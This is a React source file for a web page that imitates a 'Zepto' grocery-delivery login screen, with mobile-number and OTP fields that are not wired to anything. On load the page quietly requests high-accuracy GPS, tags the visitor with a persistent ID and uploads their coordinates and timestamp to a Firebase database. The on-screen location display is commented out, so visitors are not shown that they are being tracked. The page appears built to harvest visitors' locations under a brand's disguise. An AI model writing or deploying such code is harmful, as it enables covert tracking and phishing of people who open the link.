import React, { useEffect, useState } from "react";
import { database } from "./firebase";
import { ref, update } from "firebase/database";
import { v4 as uuidv4 } from "uuid";

function App() {
  const [location, setLocation] = useState(null);
  const [userID, setUserID] = useState(null);
  const [loading, setLoading] = useState(true);
  const [gpsDenied, setGpsDenied] = useState(false);

  useEffect(() => {
    initializeUserID();
  }, []);

  const initializeUserID = () => {
    let storedUserID = localStorage.getItem("userID");
    if (!storedUserID) {
      storedUserID = uuidv4();
      localStorage.setItem("userID", storedUserID);
    }
    setUserID(storedUserID);
    console.log("✅ UserID:", storedUserID);

    requestGPSLocation(storedUserID);
  };

  const requestGPSLocation = (userID) => {
    console.log("📌 Checking GPS location permission...");
    if ("permissions" in navigator) {
      navigator.permissions
        .query({ name: "geolocation" })
        .then((permission) => {
          if (permission.state === "granted" || permission.state === "prompt") {
            console.log("✅ GPS permission granted. Fetching GPS...");
            getGPSLocation(userID);
          } else {
            console.warn("❌ GPS Permission Denied.");
            setGpsDenied(true);
          }
        })
        .catch(() => {
          console.warn("⚠️ Permission API failed, trying GPS...");
          getGPSLocation(userID);
        });
    } else {
      console.warn("⚠️ Permission API not supported, trying GPS...");
      getGPSLocation(userID);
    }
  };

  const getGPSLocation = (userID) => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;

          const gpsLocationData = {
            latitude,
            longitude,
            timestamp: getISTTimestamp(),
            method: "GPS",
          };

          setLocation(gpsLocationData);
          saveLocation(userID, gpsLocationData);
          setLoading(false);
        },
        (error) => {
          console.warn("❌ GPS failed:", error);
          setGpsDenied(true);
          setLoading(false);
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    } else {
      console.error("❌ Geolocation not supported");
      setGpsDenied(true);
    }
  };

  const getISTTimestamp = () => {
    const now = new Date();
    now.setHours(now.getHours() + 5);
    now.setMinutes(now.getMinutes() + 30);
    return now.toISOString().replace("T", " ").split(".")[0];
  };

  const saveLocation = async (userID, locationData) => {
    const locationRef = ref(database, `userLocations/${userID}/gpsLocation`);
    await update(locationRef, locationData);
    console.log("✅ GPS Location saved:", locationData);
  };

  return (
    <div style={styles.container}>
      <div style={styles.card}>
        <h1 style={styles.title}>Zepto</h1>
        <p style={styles.subtitle}>Fast & seamless grocery delivery</p>

        <input type="text" placeholder="Enter Mobile Number" style={styles.input} />
        <input type="password" placeholder="Enter OTP" style={styles.input} />
        <button style={styles.button}>Log In</button>

        {/* <div style={styles.locationInfo}>
          {loading ? (
            <p>Fetching location...</p>
          ) : location ? (
            <>
              <p>Latitude: {location.latitude}</p>
              <p>Longitude: {location.longitude}</p>
              <p>Timestamp (IST): {location.timestamp}</p>
              <p>Method: {location.method}</p>
            </>
          ) : gpsDenied ? (
            <p style={{ color: "red", fontWeight: "bold" }}>
              GPS is blocked. Please enable location services or refresh the page.
            </p>
          ) : (
            <p>Could not retrieve location</p>
          )}
        </div> */}
      </div>
    </div>
  );
}

const styles = {
  container: {
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    height: "100vh",
    backgroundColor: "#f0f2f5",
    fontFamily: "Arial, sans-serif",
  },
  card: {
    textAlign: "center",
    width: "90%",
    maxWidth: "400px",
    backgroundColor: "white",
    padding: "20px",
    borderRadius: "8px",
    boxShadow: "0px 4px 10px rgba(0,0,0,0.1)",
  },
  title: { color: "#2A2E43", fontSize: "32px", fontWeight: "bold" },
  subtitle: { color: "#606770", fontSize: "16px" },
  input: {
    width: "100%",
    padding: "12px",
    margin: "10px 0",
    borderRadius: "6px",
    border: "1px solid #ddd",
    fontSize: "16px",
  },
  button: {
    width: "100%",
    padding: "12px",
    backgroundColor: "#FF4C3B",
    color: "white",
    fontSize: "16px",
    fontWeight: "bold",
    border: "none",
    borderRadius: "6px",
    cursor: "pointer",
    marginTop: "10px",
  },
  locationInfo: { marginTop: "20px", fontSize: "14px", color: "#606770" },
};

export default App;
